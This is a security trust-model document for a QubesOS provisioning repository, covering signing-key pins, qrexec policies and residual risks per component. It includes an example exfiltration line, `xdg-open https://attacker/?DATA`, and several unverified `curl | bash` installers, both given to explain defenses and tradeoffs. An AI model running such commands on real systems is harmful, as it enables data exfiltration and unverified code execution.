# SEQS Trust Model

Companion to the [README](README.md). This document records, **per component**,
what you are implicitly trusting when you use the scripts in this repository,
how (or whether) that trust is verified, and the residual risk that remains.

QubesOS isolates qubes from one another. These scripts deliberately *cross* those
boundaries — copying code into dom0, installing software into templates, wiring
qubes together — so every crossing is a place where trust is extended. The point
of this file is to make each assumption explicit and reviewable.

State as of **2026-05-22**. (Per-component key-fingerprint verification dates remain as captured inside each entry; this top-line date tracks the document itself.)

## Re-verifying these claims yourself

This file is the *claim*. Two companion documents help you check it before trusting the resulting qubes:

- **[VERIFY-HUMAN.md](VERIFY-HUMAN.md)** — a hands-on walkthrough for the operator: what to read top-to-bottom in what order, cross-check tables for every pinned signing-key fingerprint (with the exact `curl | gpg --show-keys` one-liners), install-time watch points, and the honest residual-risk summary.
- **[VERIFY-LLM.md](VERIFY-LLM.md)** — a machine-runnable verification protocol (bash + `curl` + `gpg` + `awk`): static syntax, embedded-key-fingerprint vs in-script pin parity, Brave's three-key set, **live upstream fingerprints** still matching the pins (catches upstream key rotation), `TRUST.md` ↔ code path coherence, qube-spec validation parity with `validateAllQubes`, `BRAVE_EXTENSIONS` well-formedness, verifier abort-order audit (every `exit 1` happens strictly *before* the corresponding irreversible write), README ↔ components coherence, and `fetchRunClean`/offline-flag logic. Each section ends with an explicit PASS/FAIL criterion and they aggregate into a single report.

The 📝 *Reviewed* trust level used throughout this document is **not** "the author eyeballed it" — it is "you, the operator, should run VERIFY-HUMAN.md (and ideally VERIFY-LLM.md) before extending dom0 trust to anything here."

## Trust levels

| Level | Meaning |
|-------|---------|
| ✅ Verified | Integrity checked against a cryptographic pin or an independent reference. |
| 📝 Reviewed | No automated check; trust rests on you having read the committed file. See VERIFY-HUMAN.md / VERIFY-LLM.md for how. |
| ⚠️ TOFU | Fetched over HTTPS; trust on first use — you trust TLS/CA + whoever answered, with no pin. Package-manager signatures apply *afterwards*. |
| ❌ Unverified | HTTPS transport only; no signature or checksum. Compromise of the host, CDN, mirror, or DNS means code execution. |

---

## 1. Trusted Computing Base

Trusted unconditionally — nothing in this repo can compensate if these are compromised.

### QubesOS + dom0
- **Trust assumption:** The hypervisor, dom0, and the qrexec/policy system enforce isolation correctly.
- **Established by:** The QubesOS project. Out of scope for this repo.
- **Residual risk:** A dom0 compromise is total. Note that `setup-qubes.sh` runs *in* dom0 — see §2.

### The QubesOS installation ISO
- **Trust assumption:** The ISO you installed from is genuine.
- **Established by:** ✅ The README walks the operator through the full verification protocol (`README.md` §3): fetch the Qubes Master Signing Key, cross-check the QMSK fingerprint `427F 11FD 0FAA 4B08 0123 F01C DDFA 1A3E 3687 9494` against three independent sources (Qubes website, the `qubes-secpack` GitHub repo, `keys.openpgp.org`), trust the QMSK, fetch the release signing key, then `gpg --verify` the ISO. Same three-source pattern as the apt keys in §3.
- **Residual risk:** A tampered ISO compromises everything from first boot, so the protocol is only as good as the operator's discipline in actually running it. The repo cannot enforce that step — skipping it makes every claim in this document downstream of it false.

### Qubes update proxy (`127.0.0.1:8082`)
- **Trust assumption:** The updates proxy and the sys-net/sys-firewall chain relay template downloads honestly.
- **Established by:** Qubes default configuration.
- **Residual risk:** It sees and routes all template `curl`/`apt` traffic. TLS still protects content end-to-end; a hostile proxy can block or attempt downgrades but not forge signed packages.

---

## 2. Bootstrap & installation

### The SEQS repository contents
- **Trust assumption:** Every script here does what it claims and nothing else.
- **Established by:** 📝 You. The README explicitly tells you to read every file first; **VERIFY-HUMAN.md** is the structured walkthrough for that read (what to look at, in what order, what to spot-check), and **VERIFY-LLM.md** is the machine-runnable cross-check (key fingerprints, abort-order audit, README↔components coherence, …). The repo is not signed.
- **Residual risk:** Whoever can write to the repo (or the branch you pull) controls dom0 and every template. **Treat repo write-access as dom0-equivalent.** The VERIFY-* docs guard against in-flight tamper between code and what TRUST.md claims, but they do not establish that the repo URL you cloned from is the one you meant.

### `REPO_VM` — the qube hosting the repo (default `personal`)
- **Trust assumption:** The qube the repo is fetched from is not compromised.
- **Established by:** 📝 Your choice of qube; configurable at the top of `setup-qubes.sh`.
- **Residual risk:** dom0 runs whatever this qube serves (see the cat hack below). A compromised `REPO_VM` = compromised dom0. A dedicated, minimal qube is preferable to a daily-driver.

### The dom0 "cat hack" copy
- **Trust assumption:** `qvm-run -p REPO_VM cat <file>` returns the genuine file.
- **Established by:** ❌ Nothing — a raw byte copy with no integrity check. This is the documented Qubes way to move files into dom0, and is exactly why review must happen *before* running anything.
- **Residual risk:** No tamper detection between `REPO_VM` and dom0; mitigated only by manual review and by `REPO_VM` being trusted. The README one-liner now appends `2>/dev/null` to the bootstrap `qvm-run` so a compromised `REPO_VM` cannot emit ANSI / CSI / OSC sequences to dom0's terminal during the fetch — `vmRun`'s sanitizer doesn't yet exist at this stage, so stderr would otherwise reach the terminal raw.

### `setup-qubes.sh` (runs in dom0)
- **Trust assumption:** Orchestrates qube creation/templating correctly and runs only the intended install scripts.
- **Established by:** 📝 Reviewed.
- **Residual risk:** Runs with the dom0 user's privileges — `qvm-*` management of every qube, plus `sudo` to write the qrexec browser policy. It also fetches and moves install scripts and `lib/*.sh` into VMs. The per-qube build inside `installQube` runs in a subshell with `set -eo pipefail`, bounded by a `BUILD_TIMEOUT_SECONDS` watchdog (default 15 min) so a hung `qvm-run`, stuck install script, or network stall can't pin the whole setup; on either failure or timeout the rollback kills + removes whichever of the `Z-`/`A-` pair got created, so re-runs are not blocked by half-built names left behind. Two best-effort caveats: (i) on timeout the watchdog kills the build subshell but not any in-flight dom0-side `qvm-run` it spawned — those linger until the rollback's `qvm-kill` closes the qrexec connection; (ii) the rollback waits up to 30 s for the qubes to shut down, after which `qvm-remove` may fail and the stale name remains — `delete-vms.sh <name>` clears it. The top-level orchestrator (the qube-spec for-loops at the bottom of the script) is not itself `set -Eeuo pipefail`, so a failed `installQube` does not abort the whole run — by design: one failed qube is isolated and the rest still build.

> ## ⚠️  REBOOT dom0 AFTER A TIMEOUT-TRIGGERED ROLLBACK  ⚠️
>
> The watchdog terminates the build subshell, but **cannot kill the dom0-side `qvm-run` processes it spawned** — those are reaped only when the rollback's `qvm-kill` tears the target qube down. Any *root-level* command that was already mid-flight inside the qube at that moment (`apt-get install`, `gpg --import`, `dpkg`, a `cat >` to `/etc/...`) may have committed a partial change before being interrupted. The visible result of `qvm-remove -f` succeeding is not a guarantee that dpkg locks, `/var/lib/qubes` state, LVM volume metadata, qrexec connection slots and dom0 mount entries are all clean.
>
> A subsequent re-run of `setup-qubes.sh` against the same name proceeds on top of that potentially-corrupted dom0 state. There is no logical interlock — the 30 s shutdown wait is what masks most of this in practice, not a guarantee.
>
> **For a high-value install: reboot dom0 between a timeout-triggered rollback and the next `setup-qubes.sh` run.** After the reboot, run `sudo qvm-volume info` and confirm no orphan volumes belonging to the failed qube remain. Only then retry (`delete-vms.sh <name>` first if the rollback left a stale name).
>
> The script prints the same warning at runtime when the timeout actually fires — but the warning scrolls past quickly amid other output, which is why it is also recorded here.

### `install-scripts/*.sh` (run inside templates / app qubes)
- **Trust assumption:** Each install script is safe to run as root in its VM.
- **Established by:** 📝 Reviewed. They run via `qvm-run` and use **passwordless `sudo`** (full-template default) — i.e. root in that VM.
- **Residual risk:** A malicious or compromised install script owns that template and every app qube based on it.

### `lib/brave.sh` sourcing mechanism
- **Trust assumption:** The shared library moved next to each install script is the genuine one.
- **Established by:** 📝 Reviewed; fetched via the same cat hack as the scripts.
- **Residual risk:** Same as any install script — runs as root in the template.

---

## 3. Software sources

### apt-repo trust anchors: `chattr +i` on every embedded-key keyring
Each apt-repo component below (Brave, Signal, Element, Docker, VS Code) drops its verified signing key at a known path under `/usr/share/keyrings/` or `/etc/apt/keyrings/` and references that path from `signed-by=` in `/etc/apt/sources.list.d/…`. After the install completes, the script runs `sudo chattr +i` on the keyring file. The Pin-Priority: -1 + named-package allowlist (Brave excludes `brave-keyring` for this reason; the others bound the package set to the app itself) gates which packages this repo can ship. `chattr +i` is the additional layer: a root-running maintainer script inside an allowlisted package that did `cp /usr/share/<app>/something.gpg ${keyring}` would silently rotate the trust anchor the `signed-by=` directive references — with no SEQS verification ever firing again. Immutability turns that into a loud dpkg failure, forcing legitimate key rotation through manual `sudo chattr -i ${keyring}` + re-verify of the new fingerprint against the same three independent sources documented per-component below.

### Brave — apt repository & signing keys ✅
- **Trust assumption:** Brave's apt signing keys are genuine; thereafter apt trusts whatever Brave signs.
- **Established by:** ✅ `lib/brave.sh` downloads the keyring and **aborts unless it contains exactly the three pinned key fingerprints**:
  - `DBF1A116C220B8C7164F98230686B78420038257`
  - `47D32A74E9A9E013A4B4926C68D513D36A73CD96`
  - `B2A3DCA350E67256740DF904DE4EC67BE4B0DCA0`

  The fingerprints were verified on **2026-05-18** by cross-checking three independent sources — forging the set would require compromising all three at once:

  1. The keyring served from the actual install source (the S3 apt bucket):
     <https://brave-browser-apt-release.s3.brave.com/brave-browser-archive-keyring.gpg>
  2. The same keys published as ASCII-armored PGP blocks on Brave's signing-keys page (a different host), under the heading "Linux Package Repositories — Release Channel":
     <https://brave.com/signing-keys/>
  3. Key `DBF1A116C220B8C7164F98230686B78420038257` independently hard-coded in an unrelated third-party project:
     <https://github.com/fphammerle/docker-brave-browser/blob/master/Dockerfile>

  See the `lib/brave.sh` header comment for the exact commands used.
- **Residual risk:** The pin only proves you got Brave's real keys; it does not vouch for what Brave builds and signs. The fingerprints were captured on **2026-05-18** — if Brave rotates keys the install fails by design and the pins must be re-verified against the links above.

### KeePassXC — AppImage with verified signature ✅
- **Trust assumption:** The KeePassXC AppImage really was built and released by the KeePassXC team.
- **Established by:** ✅ `install-scripts/components/keepass/template-vm.sh` embeds the KeePassXC release signing key, downloads the release's detached `.sig`, and **aborts unless `gpg --verify` confirms the AppImage is signed by that key** (primary fingerprint `BF5A669F2272CF4324C1FDA8CFB4C2166397D0D2`). The fingerprint was verified on **2026-05-18** against `keepassxc.org/verifying-signatures/`, a keys.openpgp.org by-fingerprint lookup, and the Arch Linux `keepassxc` PKGBUILD — see the script header. After the gpg check, the script also binds the verified bytes against in-place tamper before install: hash the AppImage, `chmod 0400`, re-hash immediately before `sudo install -m 0755 … /usr/bin/keepassxc.AppImage` and abort on drift (same pattern as BitBox/OpenOffice). The keepass qube spec carries the `offline` flag, which implies `no-handoff` — `setupBrowserSuppressionPolicy` writes a dom0 deny for `qubes.OpenURL` from `A-keepass`, and `installQube` skips wiring the per-qube xdg-open handler. Without that pair, any code that ever runs in the air-gapped vault could ferry data out via `xdg-open https://attacker/?DATA` driven through the qrexec OpenURL handoff (which is unaffected by `netvm=none`). The per-component `menu.desktop` launcher (the only one in the repo) is now installed root-owned mode 0644 via `install -m 0644 -o root -g root` instead of `sudo mv` — `mv` is a same-fs rename and preserves the source file's user:user ownership, which previously left `/usr/share/applications/keepass.desktop` writable by the qube user account so anything running as `user` in `A-keepass` could rewrite the `Exec=` line and divert the next menu click to attacker code against the unlocked vault.
- **Residual risk:** The version (currently 2.7.12) is pinned in the script; an AppImage does not auto-update, so security fixes arrive only when the pin is bumped and the script re-run. The signing key is embedded in the repo, so it also inherits §2 repo trust.

### Signal — apt repository with an embedded, verified key ✅
- **Trust assumption:** Signal's apt signing key is genuine; thereafter apt verifies package signatures and updates flow via normal template `apt upgrade`.
- **Established by:** ✅ `install-scripts/components/signal/template-vm.sh` embeds the Signal signing key and **aborts unless its fingerprint matches the pinned value** `DBA36B5181D0C816F630E889D980A17457F6FB06`. Signal publishes no fingerprint, so it was cross-checked on **2026-05-18** against the key served at `updates.signal.org`, a keys.openpgp.org by-fingerprint lookup, and Wayback Machine snapshots from 2018/2020/2022 (the same key for 8+ years) — see the script header. The script also installs `/etc/apt/preferences.d/signal-xenial.pref`, which default-denies the entire `updates.signal.org` origin (`Pin-Priority: -1`) and re-allows only `signal-desktop` / `signal-desktop-beta` at normal priority — defense-in-depth that bounds the repo's reach to a single named package set.
- **Residual risk:** The key pin proves you have Signal's real key; it does not vouch for what Signal builds and signs. The package pin further bounds a compromised-signing-infrastructure attacker to shipping a hostile `signal-desktop` — they cannot use this repo to publish a higher-version `bash`, `libc6`, `systemd`, etc. that apt would otherwise prefer over Debian's. The embedded key inherits §2 repo trust.

### Docker — apt repository with an embedded, verified key ✅
- **Trust assumption:** Docker's apt signing key is genuine; thereafter apt verifies package signatures and updates flow via normal template `apt upgrade`.
- **Established by:** ✅ `install-scripts/components/docker/template-vm.sh` embeds the Docker signing key and **aborts unless its fingerprint matches the pinned value** `9DC858229FC7DD38854AE2D88D81803C0EBFCD88`. Verified on **2026-05-19** against `download.docker.com`, `keyserver.ubuntu.com` and `keys.openpgp.org` (and Wayback Machine snapshots from 2020/2023) — see the script header.
- **Residual risk:** docker-group membership granted to `user` is **equivalent to root inside the qube** — significant because dev qubes run untrusted build code. Images pulled at runtime are arbitrary code.

### Element — apt repository with an embedded, verified key ✅
- **Trust assumption:** The Element apt signing key is genuine; thereafter apt verifies package signatures and updates flow via normal template `apt upgrade`.
- **Established by:** ✅ `install-scripts/components/element/template-vm.sh` embeds the Element signing key and **aborts unless its fingerprint matches the pinned value** `12D4CD600C2240A9F4A82071D7B0B66941D01538`. Verified on **2026-05-20** against the key served at `packages.element.io/debian/element-io-archive-keyring.gpg`, a `keyserver.ubuntu.com` by-fingerprint lookup, and a `keys.openpgp.org` by-fingerprint lookup; a Wayback Machine snapshot from 2023 carries the same fingerprint. uid is the historical "riot.im packages <packages@riot.im>" (Element's prior name). Element Desktop is not in the Debian repositories (verified 2026-05-20), so the upstream apt repo is the only mainstream channel; the install procedure matches the Brave/Signal/KeePass pattern. The script also installs `/etc/apt/preferences.d/element-io.pref`, which default-denies the entire `packages.element.io` origin (`Pin-Priority: -1`) and re-allows only `element-desktop` / `element-desktop-nightly` at normal priority — defense-in-depth that bounds the repo's reach to a single named package set.
- **Residual risk:** The key pin proves you have Element's real key; it does not vouch for what Element builds and signs. The package pin further bounds a compromised-signing-infrastructure attacker to shipping a hostile `element-desktop` — they cannot use this repo to publish a higher-version `bash` or other system package that apt would otherwise prefer over Debian's. The embedded key inherits §2 repo trust.

### VS Code — apt repository with an embedded, verified key ✅
- **Trust assumption:** The Microsoft signing key is genuine.
- **Established by:** ✅ `install-scripts/components/vscode/template-vm.sh` embeds the Microsoft signing key and **aborts unless its fingerprint matches the pinned value** `BC528686B50D79E339D3721CEB3E94ADBE1229CF`. Verified on **2026-05-19** against `packages.microsoft.com/keys/microsoft.asc`, `keyserver.ubuntu.com` and `keys.openpgp.org` — see the script header.
- **Residual risk:** VS Code extensions (the Marketplace) run with full user privileges — the real VS Code attack surface, beyond the package install.

### Telegram — snap
- **Trust assumption:** Canonical's snap store and the `telegram-desktop` publisher.
- **Established by:** ⚠️ snapd verifies Canonical-signed assertions; the snap content is the publisher's.
- **Residual risk:** Publisher or store compromise; the snap auto-updates.

### BitBoxApp — .deb with a verified signature ✅
- **Component:** `install-scripts/components/bitbox/template-vm.sh` — downloads the BitBoxApp `.deb` and its detached `.asc`.
- **Established by:** ✅ The script embeds the ShiftCrypto Security signing key and **aborts unless `gpg --verify` confirms the `.deb` is signed by it** (fingerprint `DD09E41309750EBFAE0DEF63509249B068D215AE`). Verified on **2026-05-19** against BitBox's own docs (which publish the fingerprint), `keyserver.ubuntu.com` and `keys.openpgp.org` — see the script header. Installed via `apt-get` so dependencies resolve. After the gpg check, the script also binds the verified bytes against in-place tamper between verify and install: hash the `.deb`, `chmod 0400`, re-hash immediately before `apt-get install` and abort on drift — `apt-get install` of a local `.deb` does not re-verify the gpg signature, so without this TOCTOU pin the verified file could be swapped in the window. (Not in the default `WALLET_QUBES`; add `bitbox` to a wallet qube's component list to include it.)
- **Residual risk:** The pinned version (currently 4.51.0) is bumped manually. A crypto wallet — keep its qube isolated.

### Apache OpenOffice — tarball with a verified signature ✅
- **Component:** `install-scripts/components/openoffice/template-vm.sh` — downloads the Apache OpenOffice tarball and its detached `.asc` from `downloads.apache.org`.
- **Established by:** ✅ The script embeds Jim Jagielski's Apache OpenOffice release signing key and **aborts unless `gpg --verify` confirms the tarball is signed by it** (fingerprint `A93D62ECC3C8EA12DB220EC934EA76E6791485A8`). Verified on **2026-05-19** against the Apache OpenOffice `KEYS` file, the Apache committer keyring (`people.apache.org`) and `keyserver.ubuntu.com` — see the script header. After the gpg check, the script applies the same TOCTOU pin twice: hash + `chmod 0400` + re-hash on the tarball before `tar -xzf`, and again on every extracted `.deb` (under `en-US/DEBS/` and `…/desktop-integration/`) before `apt-get install`. Without this, the verified tarball or its extracted `.deb`s could be swapped in the window — extraction happens into a user-owned mktemp dir and `apt-get install` of local `.deb`s does not re-verify a gpg signature.
- **Residual risk:** The pinned version (currently 4.1.16) is bumped manually; Apache OpenOffice releases infrequently.

### Ledger Live ❌ — unverifiable
- **Component:** `install-scripts/components/ledger/template-vm.sh` — `curl --proxy 127.0.0.1:8082 -fsSL https://download.live.ledger.com/latest/linux` followed by `sudo install -m 0755 -o root -g root TMP /usr/bin/LedgerLive.AppImage`. The download moved from the app-vm phase to the template phase so the final artifact lands root-owned at `/usr/bin/` rather than user-owned at `~/`.
- **Trust assumption:** The AppImage served by Ledger at that URL is genuine.
- **Established by:** ❌ Nothing. Ledger does **not** publish a GPG signature for the Linux AppImage (only a SHA-512 on a JS-rendered download page), and the download URL is unversioned ("latest"), so the AppImage can be neither signature-verified nor version-pinned. `-f` is set so an HTTP error page is not saved as the AppImage, but the AppImage content itself is trusted on download.
- **Residual risk:** Whoever controls Ledger's download infrastructure or DNS can serve arbitrary code into the wallet qube AT INSTALL TIME. Post-install, the AppImage is root-owned at `/usr/bin/LedgerLive.AppImage` (matching the keepass pattern), so a later compromise of the qube user account cannot silently swap the binary between sessions — the previous app-vm-phase layout left `~/LedgerLive.AppImage` user-writable, turning a one-time-clean install into a one-time-good-until-first-user-account-RCE install. The Ledger udev rules in the same `template-vm.sh` are independent — the hardware device works regardless.

### pyenv (python component) ❌ — accepted tradeoff
- **Component:** `install-scripts/components/python/app-vm.sh` — `curl -fsSL https://pyenv.run | bash`.
- **Trust assumption:** Whatever `pyenv.run` serves at run time is benign.
- **Established by:** ❌ Unverified remote code piped to a shell. **This is a deliberate choice:** pyenv is kept, in preference to the apt `python3` package, for the flexibility of installing and switching Python versions — accepting the weaker trust. (`app-vm.sh` uses `set -Eeo pipefail` — `-u` is selectively omitted because pyenv's profile sourcing is not nounset-clean; `-e` and `pipefail` are on, so an `pyenv install` / `pip` failure does abort the build.)
- **Residual risk:** Full control of the dev qube for whoever controls `pyenv.run` or its redirect target. `pip install` then pulls from PyPI (hash-checked, not signature-verified).

### Claude Code — native installer (claude-code component) ❌
- **Component:** `install-scripts/components/claude-code/app-vm.sh` — `curl -fsSL https://claude.ai/install.sh | bash`.
- **Trust assumption:** The installer script served by `claude.ai`, and the binary it fetches, are genuine.
- **Established by:** ❌ Unverified — remote code piped to a shell over HTTPS, no signature or checksum; Anthropic publishes no pinnable artifact for this path. `-f` only ensures an HTTP error page is not executed.
- **Residual risk:** Whoever controls `claude.ai/install.sh` or DNS runs code in the dev qube. Claude Code then self-updates, so the trust is ongoing — not just at install time.

### nvm + Node.js (node component) ❌ — accepted tradeoff
- **Component:** `install-scripts/components/node/app-vm.sh` — `curl -fsSL …/nvm/<pinned-tag>/install.sh | bash`.
- **Trust assumption:** The pinned nvm `install.sh` served by GitHub is benign.
- **Established by:** ❌ Unverified remote code piped to a shell, pinned to a specific nvm release. **This is a deliberate choice:** nvm is kept, in preference to the apt `nodejs` package, for the flexibility of installing and switching Node versions — accepting the weaker trust.
- **Residual risk:** Whoever controls that script (or the pinned tag) runs code in the dev qube. `npm install` then runs package lifecycle scripts — a large supply-chain surface.

### Brave wallet extensions ⚠️
- **Mechanism:** Each wallet qube's `WALLET_QUBES` spec lists extensions as `brave-extension-<name>` components; the composer looks `<name>` up in the `BRAVE_EXTENSIONS` array (name → Chrome Web Store ID) in `setup-qubes.sh`, ensures Brave is installed (idempotent `ensure_brave` in `lib/brave.sh`), and force-installs the extension via an `external_update_url` manifest. No per-extension component directory exists.
- **Trust assumption:** Google's Web Store distribution and each extension's publisher.
- **Established by:** ⚠️ Web Store hosting + publisher; extensions auto-update silently.
- **Residual risk:** A large surface — every installed wallet extension can read pages and prompt to sign in the browser. Abandoned extensions (Liquality, BlockWallet, Frame) have been removed; the `BRAVE_EXTENSIONS` list should be periodically pruned to maintained projects only. The default `WALLET_QUBES` builds two minimal wallet qubes (Ledger + Rabby, Trezor + Rabby) — much smaller blast radius than a single qube with every extension. Note also that the force-install mechanism (`external_update_url` → Chrome Web Store, written into `/opt/brave.com/brave/extensions/<id>.json`) carries **no version pin and no `.crx` hash pin** — every Brave start fetches whatever the Web Store currently serves — and force-installed extensions cannot be disabled or removed from inside Brave's UI, so a known-bad extension requires dom0 file deletion + template rebuild. This is the one channel in SEQS where the install material is not pinned the way the rest of the repo pins GPG keys against multiple independent sources. Deferred — accepted in exchange for the ergonomic `BRAVE_EXTENSIONS` flow. **See also "Wallet qube egress is unrestricted ⚠️" in §4 — the qube hosting these extensions has no outbound firewall, so a compromised extension faces no second wall on the way out.**

---

## 4. Runtime & inter-qube wiring

### Browser-link policy (`qubes.OpenURL` → `A-brave`)
- **Component:** `setup-qubes.sh` writes `/etc/qubes/policy.d/29-browser.policy` (the catch-all `@anyvm → A-brave allow`) AND `/etc/qubes/policy.d/28-browser-suppress.policy` (deny rules for every qube spec carrying `offline` or `no-handoff`, written by `setupBrowserSuppressionPolicy`). The 28- file is evaluated before the 29- file (qrexec first-match-wins), so the deny fires before the catch-all allow for opted-out qubes. The per-qube xdg launcher (`/usr/share/applications/<…>`) is also skipped for those qubes by `installQube`.
- **Trust assumption:** `A-brave` can safely handle arbitrary, possibly hostile URLs handed to it by any qube that *is* allowed to drive the handoff.
- **Established by:** A deliberate design choice — concentrating link handling in one browser qube *is* the isolation benefit.
- **Residual risk:** For qubes WITHOUT `offline` / `no-handoff`, `A-brave` is a funnel for hostile links from every qube; its compromise is in scope. The policy verb is `allow`, **not `ask`** — any code running in those qubes can silently drive `A-brave` to navigate to a chosen URL with no dom0 prompt. A compromised qube can use this to exfiltrate via DNS-in-URL, push the user at a phishing page in `A-brave`, or chain a browser 0-day. `ask` would catch the unexpected programmatic case while leaving normal user-clicked links smooth. Deferred — accepting the silent passthrough for ergonomic handoff. For qubes WITH `offline` / `no-handoff` (default: `keepass`, `wallet-ledger`, `wallet-trezor`), this channel is closed at both the dom0 qrexec boundary and the per-qube xdg config — a compromise of the qube user account cannot re-enable it from inside the qube (the dom0 file is root-owned and the 28- precedes 29- regardless of qube-side xdg state). `offline` implies `no-handoff` because an offline qube with the handoff wired could still drive `A-brave` via `qvm-open-in-vm` (qrexec is unaffected by `netvm=none`) to exfiltrate via `xdg-open https://attacker/?DATA`, silently defeating the air-gap the operator chose `offline` for.

### USB-keyboard policy override (`qubes.InputKeyboard` from `sys-usb` → dom0) ⚠️
- **Component:** `setup-qubes.sh`'s `setupUsbKeyboardPolicy` writes `/etc/qubes/policy.d/30-user-input.policy` (Qubes 4.3 only, only when `sys-usb` exists) containing:
  `qubes.InputKeyboard  *  sys-usb  @adminvm  ask default_target=@adminvm`
- **Trust assumption:** When a USB device claiming to be a keyboard is attached, the operator will reliably distinguish their own keyboard from a hostile one (BadUSB / O.MG cable / mass-storage stick with HID firmware) and decline the attach prompt for the hostile case.
- **Established by:** A deliberate ergonomic tradeoff. The shipped Qubes 4.3 `50-config-input.policy` *denies* `qubes.InputKeyboard` from `sys-usb` to dom0 outright, so external USB keyboards do not work at all out of the box. The 30- override lowers that to `ask`, matching the mouse/tablet behaviour, so an external keyboard is usable after one confirmation. `default_target=@adminvm` (dom0 pre-selected in the dialog) means a single Enter accepts the attach.
- **Residual risk:** This is a clear weakening of dom0's input isolation versus the Qubes default. Any USB device that enumerates as a HID keyboard — including a BadUSB / Rubber-Ducky implant or a vendor device with hostile firmware — triggers the same prompt as a legitimate keyboard, and the prompt is biased toward acceptance (default = dom0, single keystroke confirms). A successful accept yields keystroke injection into dom0 = total compromise. Mitigations the operator must apply themselves: never attach unknown USB devices, prefer a PS/2 keyboard or a keyboard permanently on the dom0-attached internal controller, and read the qube selector in the prompt rather than reflexively pressing Enter. Deferred — accepting the BadUSB uplift in exchange for being able to use external USB keyboards on Qubes 4.3 without per-boot manual `qvm-input-keyboard` ceremony.

### Boot / shutdown cleanup service ✅
- **Component:** `setup-qubes.sh`'s `installCleanupService` writes `/usr/local/bin/seqs-cleanup` (root, 0755) and `/etc/systemd/system/seqs-cleanup.service` into every template; the systemd unit runs `seqs-cleanup` at app-qube boot **and** shutdown. The script is a no-op inside TemplateVMs (`qubesdb-read /qubes-vm-type` guard) and `rm -rf`s each path in the `CLEANUP_DIRS` array from `setup-qubes.sh` (default: `/home/user/QubesIncoming`, `/home/user/Downloads`).
- **Trust assumption:** Every `CLEANUP_DIRS` entry is genuinely a transient location the operator wants wiped on every boot and shutdown.
- **Established by:** ✅ `validateCleanupDirs` runs in `setup-qubes.sh`'s pre-flight and refuses any entry that is not an absolute path strictly under `/home/user/` with at least one extra non-empty segment, or that contains a `..` component. So entries like `/home/user`, `/home/user/`, `/etc`, `/`, or `/home/user/../etc` are rejected before any template is built, bounding the destructive blast radius to the qube user's home tree. The generated script also `printf %q`-escapes each path so shell metacharacters in a directory name cannot break out of the cleanup loop.
- **Residual risk:** Within the validated bound, `seqs-cleanup` runs as root and *will* delete anything the operator put into a `CLEANUP_DIRS` location between boot and shutdown — Downloads vanish on every reboot, including transaction CSV exports, wallet-recovery sheets and downloaded firmware. This is by design (transient = transient), but the operator must internalise that those directories are not for storage.

### dom0 terminal output sanitization ✅
- **Component:** `setup-qubes.sh` defines `vmRun`, a wrapper around `qvm-run` that pipes the VM's combined stdout/stderr through `tr -d '\000-\010\013-\037\177'` before it reaches dom0's terminal. The `installQube` subshell runs with `set -eo pipefail` so a non-zero `qvm-run` exit cannot be masked by `tr`'s success. Every terminal-bound call site uses `vmRun`; `qvm-run` is reserved for the file-capture and file-redirect sites (`fetchFromVm`, `discoverLibFiles`, `validateAllQubes`'s component listing) where raw bytes are needed and the output is then strictly regex-validated.
- **Trust assumption:** The dom0 terminal emulator should never have to interpret a byte that came from inside a VM during install.
- **Established by:** ✅ The `tr` filter strips every C0 control character except TAB and LF, plus DEL. ESC, BEL, CR, FF, SO/SI and the full CSI/OSC sequence space therefore cannot reach the terminal — they appear as the *letters* of the would-be escape sequence (`[0m`, `]52;c;...`) which the terminal renders as plain text. UTF-8 (the 0x80–0xFF range) is preserved, so apt/dpkg log lines stay readable. Sanity-checked at edit time with an injected ESC sequence and a forced non-zero inner exit — pipefail correctly propagated.
- **Residual risk:** Mitigates a real class of attack: a compromise of any upstream apt repo, a malicious dpkg post-install scriptlet, or any third-party installer the build runs (pyenv.run, nvm, claude.ai/install.sh, the Ledger Live AppImage) emitting crafted ANSI to drive the dom0 terminal — repaint earlier "PASS" lines as "FAIL", set window title to smuggle keys via paste, write the clipboard via OSC 52, etc. The remaining surface is whatever the `qvm-*` management commands themselves (`qvm-clone`, `qvm-create`, `qvm-start`, `qvm-prefs`, `qvm-shutdown`, `qvm-kill`, `qvm-remove`, `qvm-check`, `qvm-move-to-vm`) print to dom0 directly — those are not VM-controlled output, and their messages are deterministic Qubes management strings.

### ADB file transfer ✅
- **Component:** `install-scripts/components/adb/template-vm.sh` -- `apt-get install -y adb pv` (Debian-signed). The chunked, resumable `adb-pull` helper (`install-scripts/components/adb/adb-pull.sh`) is shipped as a per-component asset by `fetchRunClean` and installed system-wide to `/usr/bin/adb-pull` in the template.
- **Qube:** `A-usb-data-transfer` (red label). `sys-usb` is **not** modified; phones are USB-attached to this qube via Qubes' standard device-attach mechanism, isolating the larger ADB code surface from the front-line USB qube.
- **Trust assumption:** The Android device / ADB peer attached to the qube is the real one.
- **Established by:** ✅ `adb` and `pv` arrive through normal Debian apt signature verification. The previous unsigned `dl.google.com` platform-tools download path is gone (and so is `utils/switch-to-new-sys-usb.sh`).
- **Residual risk:** Wireless ADB (the fallback when USB attach isn't an option) exposes a shell-capable channel on the LAN; the `adb-pull` end-of-transfer SHA-256 check catches transport corruption but **not** a malicious peer (both hashes flow through the same ADB channel). Prefer USB-attached ADB; reserve wireless ADB for trusted networks.

### Hardware-wallet udev rules ⚠️
- **Components:** `install-scripts/components/ledger/template-vm.sh` and `install-scripts/components/trezor/template-vm.sh` install the Ledger and Trezor udev rules respectively.
- **Trust assumption:** Any USB device that enumerates with a Ledger or Trezor VID/PID is the actual hardware wallet the operator intended to attach.
- **Established by:** 📝 Reviewed; mirrors vendor-published rules. The rules also tighten the upstream `MODE="0666"` to `0660` + `uaccess`/`udev-acl`, so the device is only reachable via the seated user's dynamic ACL rather than by every process on the system — a real improvement over the vendor default.
- **Residual risk:** udev grants `uaccess` based on USB VID/PID alone, and USB descriptors are entirely self-asserted. Any programmable USB device — BadUSB, an O.MG cable, a flashed Pi Pico, a hostile dev board — can claim `0x2c97` (Ledger) or `0x534c` / `0x1209` (Trezor) and receive the same ACL as the genuine wallet. Concrete consequences:
    - A device swapped during shipping, in an evil-maid scenario, or on a contaminated cable / port can present itself as the operator's wallet and talk to whatever software is running in `A-wallet-*` until the user catches it: attempt firmware downgrade, probe via crafted hidraw exchanges, or — if the wallet UI is already unlocked when the substitution happens — script-drive interactions with an open signing dialog.
    - The wallet *protocol* still authenticates the genuine device (passphrase, on-screen confirmation on the Ledger/Trezor itself), so a pure spoofer cannot forge a signed transaction. But it can talk to the host stack, and that surface is non-trivial.
